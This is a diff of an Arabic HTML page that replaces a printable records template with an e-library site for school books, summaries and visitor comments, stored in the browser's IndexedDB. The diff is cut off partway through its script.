@@ -1,1561 +1,887 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>قالب الكشوفات والبيانات الرسمية</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <!-- تحسين محركات البحث SEO لتظهر في جوجل -->
+  <title>مكتبة ميثاق محمد الإلكترونية - بوابتك الأكاديمية الأولى للمتبة المدرسية والملخصات</title>
+  <meta name="description" content="مكتبة ميثاق محمد الإلكترونية - منصة تعليمية متكاملة لتصفح وتحميل الكتب المدرسية، الملازم، الملخصات، والأجوبة الوافية لجميع الصفوف الدراسية والكتب التاريخية والثقافية.">
+  <meta name="keywords" content="مكتبة ميثاق محمد, كتب مدرسية, ملخصات وافية, مناهج تعليمية, كتب تاريخية, مكتبة إلكترونية يمنية">
+  <meta name="author" content="ميثاق محمد صالح حموده">
+  
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  
+  <style>
+    :root {
+      --primary: #0f172a;
+      --secondary: #1e3a8a;
+      --accent: #f97316;
+      --accent-gradient: linear-gradient(135deg, #f97316, #ea580c);
+      --danger: #ef4444;
+      --bg: #f8fafc;
+      --card-bg: #ffffff;
+      --text: #1e293b;
+      --text-light: #64748b;
+      --border: #e2e8f0;
+      --shadow: 0 15px 35px -5px rgba(15, 23, 42, 0.08);
+      --radius: 20px;
+    }
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.min.js"></script>
-    <script>
-        pdfjsLib.GlobalWorkerOptions.workerSrc = 'https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.worker.min.js';
-    </script>
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Tajawal', sans-serif; }
+    body { background-color: var(--bg); color: var(--text); padding-bottom: 90px; min-height: 100vh; display: flex; flex-direction: column; }
 
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;900&family=Tajawal:wght@300;400;500;700;900&family=Amiri:ital,wght@0,400;0,700;1,400&family=Changa:wght@300;400;500;600;700;800&family=El+Messiri:wght@400;500;600;700&family=Harmattan:wght@400;700&family=Lateef&family=Marhey:wght@400;500;600;700;900&family=Mirza:wght@400;500;600;700&family=Readex+Pro:wght@300;400;500;600;700&family=Reem+Kufi:wght@400;500;600;700&family=Rakkas&family=Scheherazade+New:wght@400;700&family=Aref+Ruqaa:wght@400;700&family=Katibeh&family=Lalezar&family=Lemonada:wght@400;500;600;700&family=Zain:wght@300;400;700;800;900&family=Baloo+Bhaijaan+2:wght@400;500;600;700;800&family=Almarai:wght@300;400;700;800&family=Alexandria:wght@300;400;500;600;700;800;900&family=IBM+Plex+Sans+Arabic:wght@300;400;500;600;700&family=Noto+Kufi+Arabic:wght@300;400;500;600;700;800;900&family=Noto+Naskh+Arabic:wght@400;500;600;700&family=Noto+Sans+Arabic:wght@300;400;500;600;700;800;900&family=Qahiri&family=Mada:wght@300;400;500;600;700;900&family=Vibes&family=Amiri+Quran&family=Athiti:wght@400;600&display=swap" rel="stylesheet">
+    /* شاشة الترحيب */
+    #splash-screen {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: radial-gradient(circle, #1e3a8a 0%, #0f172a 100%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      z-index: 99999;
+      animation: fadeOutSplash 0.8s ease 2.2s forwards;
+    }
+    .splash-icon { font-size: 6.5rem; color: var(--accent); animation: pulseFloat 1.5s infinite alternate; margin-bottom: 25px; }
+    .splash-title { font-size: 2.8rem; font-weight: 900; margin-bottom: 12px; text-align: center; }
+    .splash-sub { font-size: 1.25rem; opacity: 0.85; font-weight: 500; }
 
-    <style>
-        @page {
-            size: A4 landscape;
-            margin: 5mm;
-        }
+    @keyframes pulseFloat {
+      0% { transform: translateY(0) scale(1); }
+      100% { transform: translateY(-18px) scale(1.06); }
+    }
+    @keyframes fadeOutSplash { to { opacity: 0; visibility: hidden; } }
+    
+    /* الهيدر */
+    header {
+      background: linear-gradient(135deg, var(--primary), var(--secondary));
+      color: white;
+      padding: 25px 40px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: 0 10px 30px rgba(15, 23, 42, 0.25);
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      border-bottom: 3px solid rgba(249, 115, 22, 0.4);
+    }
+    .header-title h1 { font-size: 1.8rem; font-weight: 900; margin-bottom: 5px; display: flex; align-items: center; gap: 12px; }
+    .header-title p { font-size: 0.92rem; opacity: 0.82; }
 
-        * {
-            box-sizing: border-box;
-        }
+    .header-settings-btn {
+      background: rgba(255, 255, 255, 0.12);
+      border: 1.5px solid rgba(255, 255, 255, 0.3);
+      color: white;
+      width: 52px;
+      height: 52px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.4rem;
+      cursor: pointer;
+      transition: all 0.35s ease;
+    }
+    .header-settings-btn:hover { background: var(--accent); border-color: var(--accent); transform: rotate(90deg) scale(1.08); }
 
-        body {
-            font-family: 'Cairo', sans-serif;
-            margin: 0;
-            padding: 0;
-            color: #000;
-            direction: rtl;
-            background-color: #eef2f5;
-        }
+    /* القائمة المنسدلة */
+    .settings-dropdown {
+      position: absolute;
+      top: 90px;
+      left: 35px;
+      background: white;
+      border-radius: var(--radius);
+      box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+      width: 270px;
+      display: none;
+      z-index: 1100;
+      border: 1px solid var(--border);
+      overflow: hidden;
+    }
+    .settings-item {
+      padding: 16px 20px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      font-weight: 800;
+      font-size: 1rem;
+      color: var(--primary);
+      text-decoration: none;
+      border-bottom: 1px solid var(--border);
+      cursor: pointer;
+      transition: 0.25s;
+    }
+    .settings-item:hover { background: #f8fafc; color: var(--accent); padding-right: 25px; }
+    .settings-item i { font-size: 1.4rem; }
 
-        .top-ticker {
-            background: linear-gradient(135deg, #004d40, #00695c);
-            color: #ffffff;
-            padding: 8px 0;
-            font-size: 11pt;
-            font-weight: bold;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.15);
-            position: sticky;
-            top: 0;
-            z-index: 1001;
-            overflow: hidden;
-            white-space: nowrap;
-        }
+    .container { max-width: 1300px; margin: 45px auto; padding: 0 25px; flex: 1; width: 100%; }
 
-        .top-ticker marquee {
-            width: 100%;
-        }
+    .search-bar-wrapper { position: relative; margin-bottom: 45px; }
+    .search-bar {
+      width: 100%;
+      padding: 20px 25px 20px 60px;
+      border-radius: 45px;
+      border: 2px solid var(--border);
+      font-size: 1.15rem;
+      outline: none;
+      box-shadow: var(--shadow);
+      background: white;
+      transition: all 0.3s ease;
+      font-weight: 600;
+    }
+    .search-bar:focus { border-color: var(--accent); box-shadow: 0 12px 30px rgba(249, 115, 22, 0.18); }
+    .search-bar-wrapper i { position: absolute; left: 25px; top: 50%; transform: translateY(-50%); color: var(--text-light); font-size: 1.4rem; }
 
-        .control-panel {
-            text-align: center;
-            margin: 10px auto;
-            background: #ffffff;
-            padding: 10px 15px;
-            width: 95%;
-            max-width: 1350px;
-            border-radius: 8px;
-            box-shadow: 0 3px 10px rgba(0,0,0,0.15);
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            align-items: center;
-            gap: 8px;
-            position: sticky;
-            top: 45px;
-            z-index: 1000;
-        }
+    .main-tabs { display: flex; gap: 15px; margin-bottom: 45px; border-bottom: 3px solid var(--border); overflow-x: auto; padding-bottom: 5px; }
+    .tab-link {
+      padding: 16px 32px;
+      cursor: pointer;
+      font-weight: 800;
+      color: var(--text-light);
+      border-bottom: 4.5px solid transparent;
+      white-space: nowrap;
+      font-size: 1.2rem;
+      transition: all 0.3s ease;
+      border-radius: 16px 16px 0 0;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .tab-link.active { color: var(--primary); border-bottom-color: var(--accent); background: white; box-shadow: 0 -6px 20px rgba(0,0,0,0.04); }
 
-        .btn {
-            background: #00695c;
-            color: #fff;
-            border: none;
-            padding: 6px 12px;
-            font-size: 9pt;
-            font-weight: bold;
-            cursor: pointer;
-            border-radius: 4px;
-            transition: background 0.2s;
-            text-decoration: none;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-        }
+    .tab-content { display: none; }
+    .tab-content.active { display: block; }
 
-        .btn:hover {
-            filter: brightness(0.9);
-        }
+    /* مسار التنقل */
+    .nav-path {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 35px;
+      font-weight: 900;
+      color: var(--primary);
+      font-size: 1.35rem;
+      background: white;
+      padding: 20px 30px;
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      border: 1px solid var(--border);
+    }
+    .back-btn {
+      background: var(--secondary);
+      color: white;
+      border: none;
+      padding: 10px 22px;
+      border-radius: 12px;
+      cursor: pointer;
+      font-size: 0.98rem;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-weight: 800;
+      transition: all 0.25s ease;
+    }
+    .back-btn:hover { background: var(--primary); transform: translateX(-4px); }
 
-        .btn-green { background: #2e7d32; }
-        .btn-blue { background: #1565c0; }
-        .btn-red { background: #c62828; }
-        .btn-amber { background: #d97706; color: #fff; }
-        .btn-whatsapp { background: #25d366; color: #fff; }
-        .btn-save { background: #7b1fa2; color: #fff; }
-        .btn-archive { background: #0277bd; color: #fff; }
-        .btn-purple { background: #6a1b9a; color: #fff; }
-        .btn-teal { background: #00838f; color: #fff; }
-        .btn-indigo { background: #3f51b5; color: #fff; }
-        .btn-excel { background: #1b5e20; color: #fff; }
-        
-        .btn-mic-start { background: #2e7d32; color: #fff; }
-        .btn-mic-stop { background: #c62828; color: #fff; }
-        .mic-active-glow { animation: pulse-mic 1.2s infinite; }
+    /* شبكة الصفوف */
+    .grades-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+      gap: 25px;
+    }
+    .grade-box {
+      background: white;
+      border: 2px solid var(--border);
+      padding: 45px 20px;
+      border-radius: var(--radius);
+      text-align: center;
+      cursor: pointer;
+      font-weight: 900;
+      color: var(--primary);
+      font-size: 1.3rem;
+      transition: all 0.35s ease;
+      box-shadow: var(--shadow);
+    }
+    .grade-box:hover {
+      background: linear-gradient(135deg, var(--secondary), var(--primary));
+      color: white;
+      border-color: transparent;
+      transform: translateY(-8px);
+      box-shadow: 0 20px 40px rgba(15, 23, 42, 0.25);
+    }
 
-        @keyframes pulse-mic {
-            0% { transform: scale(1); filter: brightness(1); }
-            50% { transform: scale(1.06); filter: brightness(1.3); }
-            100% { transform: scale(1); filter: brightness(1); }
-        }
+    /* الأقسام الأربعة الداخلية */
+    .sub-sections-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+      gap: 25px;
+    }
+    .sub-section-card {
+      background: white;
+      border: 2px solid var(--border);
+      border-radius: var(--radius);
+      padding: 35px 25px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.35s ease;
+      box-shadow: var(--shadow);
+    }
+    .sub-section-card:hover {
+      border-color: var(--accent);
+      transform: translateY(-8px);
+      box-shadow: 0 20px 40px rgba(249, 115, 22, 0.2);
+    }
+    .sub-section-icon { font-size: 3.5rem; color: var(--accent); margin-bottom: 18px; }
+    .sub-section-title { font-size: 1.35rem; font-weight: 900; color: var(--primary); margin-bottom: 10px; }
+    .sub-section-desc { font-size: 0.95rem; color: var(--text-light); line-height: 1.5; }
 
-        .control-group {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            background: #f0f0f0;
-            padding: 4px 8px;
-            border-radius: 4px;
-            font-size: 9pt;
-            font-weight: bold;
-        }
+    /* كروت الكتب */
+    .books-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(290px, 1fr)); gap: 35px; margin-top: 40px; }
+    .book-card {
+      background: var(--card-bg);
+      border-radius: var(--radius);
+      overflow: hidden;
+      box-shadow: var(--shadow);
+      border: 1px solid var(--border);
+      display: flex;
+      flex-direction: column;
+      transition: all 0.35s ease;
+    }
+    .book-card:hover { transform: translateY(-8px); box-shadow: 0 25px 50px rgba(15, 23, 42, 0.15); }
+    .book-cover { height: 240px; background: #e2e8f0; object-fit: cover; width: 100%; display: flex; align-items: center; justify-content: center; color: #94a3b8; font-size: 5rem; }
+    .book-details { padding: 25px; flex-grow: 1; display: flex; flex-direction: column; }
+    .book-title { font-size: 1.35rem; font-weight: 900; margin-bottom: 8px; color: var(--primary); line-height: 1.4; }
+    .book-meta { font-size: 0.9rem; color: var(--text-light); margin-bottom: 12px; font-weight: 700; }
+    .book-note { font-size: 0.92rem; color: var(--secondary); background: #eff6ff; padding: 10px 14px; border-radius: 10px; margin-bottom: 18px; line-height: 1.5; border-right: 4px solid var(--secondary); }
+    
+    .book-actions { display: flex; gap: 8px; margin-top: auto; flex-wrap: wrap; }
+    .btn-action { flex: 1; min-width: 90px; padding: 10px; text-align: center; border: none; border-radius: 12px; text-decoration: none; font-size: 0.9rem; font-weight: 800; cursor: pointer; transition: all 0.25s ease; display: flex; align-items: center; justify-content: center; gap: 5px; }
+    .btn-view { background: #e0f2fe; color: #0284c7; }
+    .btn-view:hover { background: #bae6fd; }
+    .btn-download { background: #dcfce7; color: #16a34a; }
+    .btn-download:hover { background: #bbf7d0; }
+    
+    /* أزرار الأدمن */
+    .btn-edit { background: #fef3c7; color: #d97706; display: none; }
+    .btn-edit:hover { background: #fde68a; }
+    .btn-delete { background: #fee2e2; color: var(--danger); display: none; }
+    .btn-delete:hover { background: #fecaca; }
 
-        select,
-        input[type="color"],
-        input[type="text"] {
-            padding: 4px 6px;
-            border-radius: 4px;
-            border: 1px solid #ccc;
-            font-family: inherit;
-            font-weight: bold;
-            cursor: pointer;
-            font-size: 9pt;
-            height: 30px;
-            background: #fff;
-        }
+    /* لوحة الإدارة */
+    .form-card { background: white; padding: 45px; border-radius: var(--radius); box-shadow: var(--shadow); margin-bottom: 45px; border: 3px dashed var(--accent); }
+    .form-card h3 { color: var(--primary); margin-bottom: 25px; font-size: 1.6rem; font-weight: 900; display: flex; align-items: center; gap: 12px; }
+    .form-group { margin-bottom: 22px; }
+    .form-group label { display: block; margin-bottom: 10px; font-weight: 800; font-size: 1.05rem; color: var(--primary); }
+    .form-group input, .form-group textarea, .form-group select { width: 100%; padding: 16px 20px; border: 2px solid var(--border); border-radius: 14px; font-size: 1.05rem; outline: none; background: #fafafa; }
+    .form-group input[type="file"] { padding: 12px; background: white; cursor: pointer; }
+    .submit-btn { background: var(--accent-gradient); color: white; border: none; padding: 16px; border-radius: 14px; cursor: pointer; font-size: 1.15rem; font-weight: 900; width: 100%; transition: all 0.3s ease; box-shadow: 0 10px 20px rgba(249,115,22,0.3); }
+    .submit-btn:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(249,115,22,0.4); }
 
-        input[type="color"] {
-            width: 32px;
-            padding: 0;
-            border: none;
-            background: none;
-        }
+    .comments-section { margin-top: 40px; }
+    .comment-card { background: white; padding: 25px; border-radius: var(--radius); margin-bottom: 20px; border-right: 6px solid var(--accent); border: 1.5px solid var(--border); box-shadow: var(--shadow); display: flex; justify-content: space-between; align-items: flex-start; }
+    .comment-author { font-weight: 900; color: var(--primary); font-size: 1.2rem; }
+    .comment-date { font-size: 0.88rem; color: var(--text-light); margin-top: 8px; }
 
-        .search-input {
-            width: 180px;
-            cursor: text !important;
-        }
-
-        .sheet-container {
-            width: 297mm;
-            min-height: 198mm;
-            padding: 5mm 8mm;
-            margin: 15px auto;
-            background: #fff;
-            box-sizing: border-box;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            position: relative;
-            page-break-before: always;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-        }
-
-        .header-top {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 2px solid #222;
-            padding-bottom: 2px;
-            margin-bottom: 4px;
-            font-size: 11pt;
-            font-weight: bold;
-            gap: 5px;
-        }
-
-        .editable-header, th[contenteditable="true"] {
-            border: 1px dashed transparent;
-            padding: 2px 5px;
-            border-radius: 3px;
-        }
-
-        .editable-header:hover, th[contenteditable="true"]:hover {
-            border-color: #00695c;
-            background: #f9f9f9;
-        }
-
-        .editable-header:focus, th[contenteditable="true"]:focus {
-            outline: 2px solid #00695c;
-            background: #fffde7;
-        }
-
-        .table-wrapper {
-            width: 100%;
-            overflow-x: auto;
-            margin-bottom: 5px;
-            flex-grow: 1;
-        }
-
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            text-align: center;
-            table-layout: fixed;
-        }
-
-        th, td {
-            border: 1px solid #333;
-            padding: 2px;
-            font-size: 9.5pt;
-            height: 26px;
-        }
-
-        th {
-            background-color: #d1d8e0 !important;
-            -webkit-print-color-adjust: exact;
-            print-color-adjust: exact;
-            color: #111;
-            font-weight: bold;
-            cursor: pointer;
-        }
-
-        tr:nth-child(even) {
-            background-color: #f8f9fa !important;
-            -webkit-print-color-adjust: exact;
-            print-color-adjust: exact;
-        }
-
-        .table-input {
-            width: 100%;
-            height: 100%;
-            border: none;
-            background: transparent;
-            font-family: inherit;
-            font-size: 9.5pt;
-            font-weight: bold;
-            text-align: right;
-            direction: rtl;
-            padding: 0 4px;
-        }
-
-        .table-input:focus {
-            background-color: #fffde7;
-            outline: 2px solid #00695c;
-        }
-
-        .active-row {
-            background-color: #fff3e0 !important;
-        }
-
-        .footer-bottom {
-            display: flex;
-            justify-content: space-between;
-            font-size: 8.5pt;
-            color: #444;
-            border-top: 1px solid #888;
-            padding-top: 2px;
-            margin-top: auto;
-        }
-
-        .custom-modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.6);
-            z-index: 9999;
-            justify-content: center;
-            align-items: center;
-            padding: 12px;
-        }
-
-        .modal-content {
-            background: #fff;
-            width: 90%;
-            max-width: 600px;
-            border-radius: 8px;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
-            max-height: 85vh;
-            overflow-y: auto;
-        }
-
-        .archive-item {
-            background: #f8f9fa;
-            border: 1px solid #ddd;
-            padding: 12px;
-            margin-bottom: 10px;
-            border-radius: 6px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            gap: 10px;
-            flex-wrap: wrap;
-        }
-
-        .archive-item-info {
-            font-size: 10pt;
-            font-weight: bold;
-            color: #333;
-        }
-
-        @media (max-width: 700px) {
-            .sheet-container {
-                width: 100%;
-                min-height: 198mm;
-                padding: 8px;
-                overflow: auto;
-            }
-
-            .header-top {
-                font-size: 9pt;
-            }
-
-            .search-input {
-                width: 140px;
-            }
-        }
-
-        @media print {
-            body {
-                background: #fff;
-            }
-
-            .top-ticker,
-            .control-panel,
-            .custom-modal {
-                display: none !important;
-            }
-
-            .sheet-container {
-                box-shadow: none !important;
-                margin: 0 !important;
-                width: 100% !important;
-                height: 198mm !important;
-                min-height: 198mm !important;
-                padding: 4mm !important;
-                page-break-before: always;
-                overflow: hidden !important;
-            }
-
-            .table-input {
-                background: transparent !important;
-                border: none !important;
-            }
-        }
-    </style>
+    footer { text-align: center; padding: 30px; color: var(--text-light); font-size: 1rem; border-top: 1px solid var(--border); background: white; margin-top: auto; font-weight: 700; }
+  </style>
 </head>
-
 <body>
 
-    <video id="videoElement" autoplay playsinline style="display:none; width:320px; height:240px;"></video>
-    <canvas id="canvasElement" style="display:none;"></canvas>
+  <!-- شاشة الترحيب -->
+  <div id="splash-screen">
+    <div class="splash-icon"><i class="fa-solid fa-graduation-cap"></i></div>
+    <div class="splash-title">مكتبة ميثاق محمد الإلكترونية</div>
+    <div class="splash-sub">بوابتك الأكاديمية الأولى للمراجع والكتب المدرسية</div>
+  </div>
 
-    <div class="top-ticker">
-        <marquee behavior="scroll" direction="right" scrollamount="5">
-            ✨ نظام إدارة السجلات والأرشيف الرسمي | دقة في التنظيم وسرعة في الإنجاز - تطوير : ميثاق محمد صالح حموده ✨
-        </marquee>
+  <header>
+    <div class="header-title">
+      <h1><i class="fa-solid fa-book-open-reader" style="color: var(--accent);"></i> مكتبة ميثاق محمد الإلكترونية</h1>
+      <p>منصة التعليم، الكتب المدرسية والمراجع الشاملة</p>
+    </div>
+    
+    <div style="position: relative;">
+      <div class="header-settings-btn" onclick="toggleSettingsMenu()">
+        <i class="fa-solid fa-gear"></i>
+      </div>
+
+      <div class="settings-dropdown" id="settingsDropdown">
+        <a href="https://wa.me/967784327056" target="_blank" class="settings-item">
+          <i class="fa-brands fa-whatsapp" style="color: #25d366; font-size: 1.6rem;"></i> تواصل مع المطور
+        </a>
+        <div class="settings-item" onclick="promptAdminLogin()">
+          <i class="fa-solid fa-lock" style="color: var(--accent);"></i> لوحة الإدارة (الأدمن)
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <div class="container">
+    <div class="search-bar-wrapper">
+      <i class="fa-solid fa-magnifying-glass"></i>
+      <input type="text" class="search-bar" placeholder="ابحث عن كتاب، مرجع، أو ملخص..." onkeyup="searchBooks(this.value)">
     </div>
 
-    <div class="control-panel">
-        <button class="btn btn-green" onclick="onPdfButtonClicked()" style="font-size:10pt;">🖨️ طباعة / حفظ PDF</button>
-        <button class="btn btn-excel" onclick="onExcelButtonClicked()" title="تصدير وتحميل كافة البيانات كملف Excel (CSV)">📊 حفظ ملف Excel</button>
-        <button class="btn btn-blue" onclick="addNewPage()">📄 صفحة جديدة</button>
+    <div class="main-tabs">
+      <div class="tab-link active" onclick="switchTab('academic', event)"><i class="fa-solid fa-school"></i> الأقسام الأكاديمية</div>
+      <div class="tab-link" onclick="switchTab('cultural', event)"><i class="fa-solid fa-book-bookmark"></i> الكتب التاريخية والثقافية</div>
+      <div class="tab-link" onclick="switchTab('feedback', event)"><i class="fa-solid fa-comments"></i> آراء وانطباعات الزوار</div>
+    </div>
+
+    <!-- 1. الأقسام الدراسية -->
+    <div id="tab-academic" class="tab-content active">
+      
+      <!-- المستوى الأول: شبكة الصفوف -->
+      <div id="viewGrades">
+        <div class="section-subtitle" style="margin-bottom: 25px; font-weight: 900; color: var(--primary); font-size: 1.45rem;"><i class="fa-solid fa-layer-group"></i> اختر الصف الدراسي المطلوب:</div>
+        <div class="grades-grid" id="gradesContainer"></div>
+      </div>
+
+      <!-- المستوى الثاني: الأقسام الأربعة -->
+      <div id="viewSubSections" style="display: none;">
+        <div class="nav-path">
+          <span>الصف الحالي: <span id="currentGradeTitle" style="color: var(--accent);"></span></span>
+          <button class="back-btn" onclick="goBackToGrades()"><i class="fa-solid fa-arrow-right"></i> رجوع للصفوف</button>
+        </div>
+
+        <div class="sub-sections-grid">
+          <div class="sub-section-card" onclick="openCategory('part1', 'الكتاب الدراسي (الجزء الأول)')">
+            <div class="sub-section-icon"><i class="fa-solid fa-book"></i></div>
+            <div class="sub-section-title">الكتاب الدراسي (الجزء الأول)</div>
+            <div class="sub-section-desc">تصفح ورفع كتب الفصل الدراسي الأول.</div>
+          </div>
+          <div class="sub-section-card" onclick="openCategory('part2', 'الكتاب الدراسي (الجزء الثاني)')">
+            <div class="sub-section-icon"><i class="fa-solid fa-book-open"></i></div>
+            <div class="sub-section-title">الكتاب الدراسي (الجزء الثاني)</div>
+            <div class="sub-section-desc">تصفح ورفع كتب الفصل الدراسي الثاني.</div>
+          </div>
+          <div class="sub-section-card" onclick="openCategory('notes1', 'ملخصات والوافيات للجزء الأول')">
+            <div class="sub-section-icon"><i class="fa-solid fa-file-invoice"></i></div>
+            <div class="sub-section-title">ملخصات والوافيات للجزء الأول</div>
+            <div class="sub-section-desc">تصفح ورفع ملخصات وحلول الجزء الأول.</div>
+          </div>
+          <div class="sub-section-card" onclick="openCategory('notes2', 'ملخصات والوافيات للجزء الثاني')">
+            <div class="sub-section-icon"><i class="fa-solid fa-file-lines"></i></div>
+            <div class="sub-section-title">ملخصات والوافيات للجزء الثاني</div>
+            <div class="sub-section-desc">تصفح ورفع ملخصات وحلول الجزء الثاني.</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- المستوى الثالث: عرض الكتب الأكاديمية -->
+      <div id="viewBooks" style="display: none;">
+        <div class="nav-path">
+          <span id="currentSectionTitle">قسم الكتب</span>
+          <button class="back-btn" onclick="goBackToSubSections()"><i class="fa-solid fa-arrow-right"></i> رجوع للأقسام</button>
+        </div>
+
+        <!-- لوحة التحكم للأدمن -->
+        <div class="form-card" id="adminAcademicForm" style="display: none;">
+          <h3><i class="fa-solid fa-shield-halved" style="color: var(--accent);"></i> رفع كتاب جديد (خاص بالمطور ميثاق)</h3>
+          <form id="academicForm" onsubmit="addAcademicItem(event)">
+            <div class="form-group">
+              <label>عنوان الكتاب أو الملخص</label>
+              <input type="text" id="acadTitle" required placeholder="مثال: كتاب الرياضيات الجزء الأول">
+            </div>
+            <div class="form-group">
+              <label>ملاحظات الكتاب (اختياري)</label>
+              <textarea id="acadNote" rows="2" placeholder="اكتب أي ملاحظة أو تنبيه حول هذا الكتاب..."></textarea>
+            </div>
+            <div class="form-group">
+              <label>اختر صورة الغلاف من هاتفك:</label>
+              <input type="file" id="acadCoverFile" accept="image/*">
+            </div>
+            <div class="form-group">
+              <label>اختر ملف الـ PDF الحقيقي من هاتفك:</label>
+              <input type="file" id="acadFile" accept="application/pdf" required>
+            </div>
+            <button type="submit" class="submit-btn">رفع وحفظ الكتاب في هذا القسم</button>
+          </form>
+        </div>
+
+        <div class="books-grid" id="academicGrid"></div>
+      </div>
+
+    </div>
+
+    <!-- 2. الكتب التاريخية والثقافية -->
+    <div id="tab-cultural" class="tab-content">
+      <div class="form-card" style="border-style: solid;">
+        <h3><i class="fa-solid fa-book-bookmark" style="color: var(--accent);"></i> مشاركة كتاب تاريخي أو ثقافي</h3>
+        <form id="culturalForm" onsubmit="addCulturalBook(event)">
+          <div class="form-group">
+            <label>عنوان الكتاب</label>
+            <input type="text" id="cultTitle" required placeholder="مثال: مقدمة ابن خلدون">
+          </div>
+          <div class="form-group">
+            <label>اسم الكاتب / المؤلف (اختياري)</label>
+            <input type="text" id="cultAuthor" placeholder="مثال: ابن خلدون">
+          </div>
+          <div class="form-group">
+            <label>ملاحظات الكتاب أو نبذة مختصرة (اختياري)</label>
+            <textarea id="cultDesc" rows="2" placeholder="اكتب ملاحظة أو نبذة عن الكتاب..."></textarea>
+          </div>
+          <div class="form-group">
+            <label>اختر صورة الغلاف من هاتفك:</label>
+            <input type="file" id="cultCoverFile" accept="image/*">
+          </div>
+          <div class="form-group">
+            <label>اختر ملف الـ PDF الحقيقي من هاتفك:</label>
+            <input type="file" id="cultFile" accept="application/pdf" required>
+          </div>
+          <button type="submit" class="submit-btn">نشر الكتاب في المكتبة الثقافية</button>
+        </form>
+      </div>
+
+      <h3 style="margin: 45px 0 20px 0; color: var(--primary); font-size: 1.6rem; font-weight: 900;"><i class="fa-solid fa-bookmark" style="color: var(--accent);"></i> أرشيف الكتب التاريخية والثقافية</h3>
+      <div class="books-grid" id="culturalGrid"></div>
+    </div>
+
+    <!-- 3. آراء الزوار -->
+    <div id="tab-feedback" class="tab-content">
+      <div class="form-card" style="border-style: solid;">
+        <h3><i class="fa-solid fa-comments" style="color: var(--accent);"></i> شاركنا رأيك أو انطباعك عن المكتبة</h3>
+        <form id="feedbackForm" onsubmit="addFeedback(event)">
+          <div class="form-group">
+            <label>اسمك الكريم</label>
+            <input type="text" id="feedName" required placeholder="أدخل اسمك هنا">
+          </div>
+          <div class="form-group">
+            <label>تعليقك أو رسالتك</label>
+            <textarea id="feedText" rows="3" required placeholder="كيف وجدت تجربة التصفح داخل المكتبة؟"></textarea>
+          </div>
+          <button type="submit" class="submit-btn">إرسال التعليق للمنصة</button>
+        </form>
+      </div>
+
+      <div class="comments-section" id="feedbackList"></div>
+    </div>
+
+  </div>
+
+  <footer>
+    جميع الحقوق محفوظة © 2026 - مكتبة ميثاق محمد الإلكترونية
+  </footer>
+
+  <script>
+    const grades = [
+      "الصف الأول", "الصف الثاني", "الصف الثالث", "الصف الرابع", "الصف الخامس", "الصف السادس",
+      "الصف السابع", "الصف الثامن", "الصف التاسع", "أول ثانوي", "ثاني ثانوي", "ثالث ثانوي"
+    ];
+
+    let selectedGrade = "";
+    let selectedCategory = ""; 
+    let selectedCategoryName = "";
+    
+    let isAdminLoggedIn = sessionStorage.getItem('methaq_admin_session') === 'active';
+
+    let db;
+    let academicData = [];
+    let culturalData = [];
+    let feedbackData = JSON.parse(localStorage.getItem('methaq_feedback')) || [
+      { id: 1, name: "محمد أحمد", text: "مكتبة إلكترونية مرتبطة ومنظمة جداً، بارك الله في جهودك يا ميثاق!", date: "2026-10-28" }
+    ];
+
+    const request = indexedDB.open("MethaqLibraryDB", 4);
+    
+    request.onerror = function(event) {
+      console.error("فشل فتح قاعدة البيانات الداخلية");
+    };
+
+    request.onupgradeneeded = function(event) {
+      db = event.target.result;
+      if (!db.objectStoreNames.contains("books")) {
+        db.createObjectStore("books", { keyPath: "id" });
+      }
+    };
+
+    request.onsuccess = function(event) {
+      db = event.target.result;
+      loadAllBooks();
+    };
+
+    function loadAllBooks() {
+      const transaction = db.transaction(["books"], "readonly");
+      const store = transaction.objectStore("books");
+      const getAllRequest = store.getAll();
+
+      getAllRequest.onsuccess = function() {
+        const allBooks = getAllRequest.result;
+        academicData = allBooks.filter(b => b.type === 'academic');
